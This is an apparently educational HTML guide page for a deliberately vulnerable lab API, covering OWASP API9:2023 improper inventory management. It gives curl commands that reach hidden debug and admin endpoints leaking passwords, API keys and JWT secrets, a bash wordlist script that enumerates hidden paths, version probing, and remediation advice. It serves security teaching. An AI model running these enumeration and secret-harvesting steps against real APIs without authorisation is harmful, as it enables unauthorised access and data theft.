@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>API9:2023 - Improper Inventory Management | VulnAPI-101</title>
+    <link rel="stylesheet" href="/static/css/style.css">
+</head>
+<body>
+    <header>
+        <h1>VulnAPI-101 <span class="warning-badge">GUIDES</span></h1>
+        <p>OWASP API Top 10 Vulnerability Reference</p>
+    </header>
+
+    <nav>
+        <ul>
+            <li><a href="/static/index.html">API Testing</a></li>
+            <li><a href="/guides/">Vulnerability Guides</a></li>
+            <li><a href="/guides/by-vulnerability.html">By Vulnerability</a></li>
+            <li><a href="/guides/by-file.html">By File</a></li>
+        </ul>
+    </nav>
+
+    <main>
+        <div class="container">
+            <h2><span class="owasp-tag owasp-api9">API9:2023</span> Improper Inventory Management</h2>
+            <span class="badge badge-warning">MEDIUM SEVERITY</span>
+
+            <h3>Description</h3>
+            <p>APIs tend to expose more endpoints than traditional web applications. Proper documentation and inventory of all API endpoints and versions is essential. This vulnerability includes undocumented endpoints, deprecated versions, debug endpoints left in production, and shadow APIs.</p>
+
+            <h3>Affected Files</h3>
+            <ul>
+                <li><code>app/routes/debug.py</code> - Hidden debug endpoints</li>
+                <li><code>app/routes/admin.py</code> - Hidden admin endpoints</li>
+                <li><code>app/routes/users.py</code> - Undocumented user lookup</li>
+                <li><code>app/routes/orders.py</code> - Hidden statistics endpoint</li>
+                <li><code>app/routes/auth.py</code> - Undocumented token verification</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Exploitation Guide</h2>
+
+            <h3>1. Discover All Routes</h3>
+            <p>The debug endpoint exposes all registered routes:</p>
+            <div class="code-container">
+                <pre><code># List all API routes
+curl http://localhost:5000/api/debug/routes | jq
+
+# Filter for interesting endpoints
+curl -s http://localhost:5000/api/debug/routes | jq '.routes[] | select(.path | contains("admin") or contains("debug") or contains("hidden"))'
+
+# This reveals undocumented endpoints like:
+# /api/debug/.hidden
+# /api/admin/hidden/users
+# /api/admin/hidden/debug
+# /api/users/by-api-key/<api_key>
+# /api/orders/statistics</code></pre>
+            </div>
+
+            <h3>2. Hidden Debug Endpoints</h3>
+            <div class="code-container">
+                <pre><code># Access hidden debug endpoint
+curl http://localhost:5000/api/debug/.hidden
+
+# Response reveals secrets:
+# {
+#   "message": "You found the hidden endpoint!",
+#   "secrets": {
+#     "admin_password": "admin123",
+#     "api_key": "secret-api-key-12345",
+#     "database": "sqlite:///vulnapi.db"
+#   }
+# }
+
+# Path-encoded hidden endpoint
+curl "http://localhost:5000/api/debug/..%2f..%2f"</code></pre>
+            </div>
+
+            <h3>3. Hidden Admin Endpoints</h3>
+            <div class="code-container">
+                <pre><code># Hidden user list (no auth required!)
+curl http://localhost:5000/api/admin/hidden/users
+
+# Hidden debug info
+curl http://localhost:5000/api/admin/hidden/debug
+
+# Response includes JWT secret and other sensitive data</code></pre>
+            </div>
+
+            <h3>4. Undocumented User Lookup</h3>
+            <div class="code-container">
+                <pre><code># Lookup user by API key
+curl http://localhost:5000/api/users/by-api-key/admin-api-key-12345
+
+# This endpoint isn't documented but exposes full user data
+# Can enumerate API keys to find valid ones</code></pre>
+            </div>
+
+            <h3>5. Hidden Statistics Endpoint</h3>
+            <div class="code-container">
+                <pre><code># Order statistics (no auth required)
+curl http://localhost:5000/api/orders/statistics
+
+# Exposes business-sensitive data:
+# - Total orders
+# - Total revenue
+# - Total profit
+# - Status breakdown</code></pre>
+            </div>
+
+            <h3>6. Undocumented Token Verification</h3>
+            <div class="code-container">
+                <pre><code># Verify token endpoint
+curl http://localhost:5000/api/auth/verify-token \
+  -H "Authorization: Bearer $TOKEN"
+
+# Returns decoded token payload - useful for reconnaissance</code></pre>
+            </div>
+
+            <h3>7. Endpoint Enumeration Script</h3>
+            <p>Script to discover hidden endpoints:</p>
+            <div class="code-container">
+                <pre><code>#!/bin/bash
+# Enumerate potential hidden endpoints
+
+BASE="http://localhost:5000/api"
+WORDLIST=(
+  "admin" "debug" "test" "dev" "staging" "backup"
+  "internal" "private" "secret" "hidden" "old"
+  "v1" "v2" "v3" "beta" "alpha" "legacy"
+  "config" "settings" "env" "info" "status"
+  "health" "metrics" "stats" "logs" "audit"
+  "swagger" "docs" "graphql" "graphiql"
+  ".git" ".env" "robots.txt" "sitemap.xml"
+)
+
+for word in "${WORDLIST[@]}"; do
+  response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$word")
+  if [ "$response" != "404" ]; then
+    echo "[+] Found: $BASE/$word (HTTP $response)"
+  fi
+done
+
+# Check for common paths under each resource
+for resource in users products orders admin debug files auth; do
+  for word in hidden internal debug test backup export import; do
+    response=$(curl -s -o /dev/null -w "%{http_code}" "$BASE/$resource/$word")
+    if [ "$response" != "404" ]; then
+      echo "[+] Found: $BASE/$resource/$word (HTTP $response)"
+    fi
+  done
+done</code></pre>
+            </div>
+
+            <h3>8. Version Discovery</h3>
+            <div class="code-container">
+                <pre><code># Check for versioned endpoints
+for v in v1 v2 v3 api-v1 api-v2; do
+  curl -s -o /dev/null -w "%{http_code} - /$v/users\n" "http://localhost:5000/$v/users"
+done
+
+# Check API info endpoint
+curl http://localhost:5000/api | jq</code></pre>
+            </div>
+        </div>
+
+        <div class="container">
+            <h2>Hidden Endpoints in VulnAPI-101</h2>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Endpoint</th>
+                        <th>Description</th>
+                        <th>Risk</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td><code>/api/debug/.hidden</code></td>
+                        <td>Exposes secrets</td>
+                        <td class="severity-critical">Critical</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/admin/hidden/users</code></td>
+                        <td>User dump (no auth)</td>
+                        <td class="severity-high">High</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/admin/hidden/debug</code></td>
+                        <td>Config exposure</td>
+                        <td class="severity-critical">Critical</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/users/by-api-key/{key}</code></td>
+                        <td>User lookup by key</td>
+                        <td class="severity-medium">Medium</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/orders/statistics</code></td>
+                        <td>Business metrics</td>
+                        <td class="severity-medium">Medium</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/auth/verify-token</code></td>
+                        <td>Token introspection</td>
+                        <td class="severity-low">Low</td>
+                    </tr>
+                    <tr>
+                        <td><code>/api/debug/routes</code></td>
+                        <td>Full API inventory</td>
+                        <td class="severity-high">High</td>
+                    </tr>
+                </tbody>
+            </table>
+        </div>
+
+        <div class="container">
+            <h2>Impact</h2>
+            <ul>
+                <li><strong>Shadow APIs:</strong> Undocumented endpoints bypass security review</li>
+                <li><strong>Data Exposure:</strong> Hidden endpoints may lack authentication</li>
+                <li><strong>Attack Surface:</strong> More endpoints = more attack vectors</li>
+                <li><strong>Compliance:</strong> Undocumented APIs violate security policies</li>
+            </ul>
+        </div>
+
+        <div class="container">
+            <h2>Remediation</h2>
+            <ol>
+                <li>Maintain complete API documentation (OpenAPI/Swagger)</li>
+                <li>Remove all debug/test endpoints before production</li>
+                <li>Use API gateway to control exposed endpoints</li>
+                <li>Regular API endpoint audits</li>
+                <li>Implement API versioning properly</li>
+                <li>Monitor for unauthorized endpoint access</li>
+            </ol>
+        </div>
+    </main>
+
+    <footer>
+        <p>VulnAPI-101 - Educational Purposes Only | <a href="https://owasp.org/API-Security/editions/2023/en/0xa9-improper-inventory-management/">OWASP Reference</a></p>
+    </footer>
+</body>
+</html>
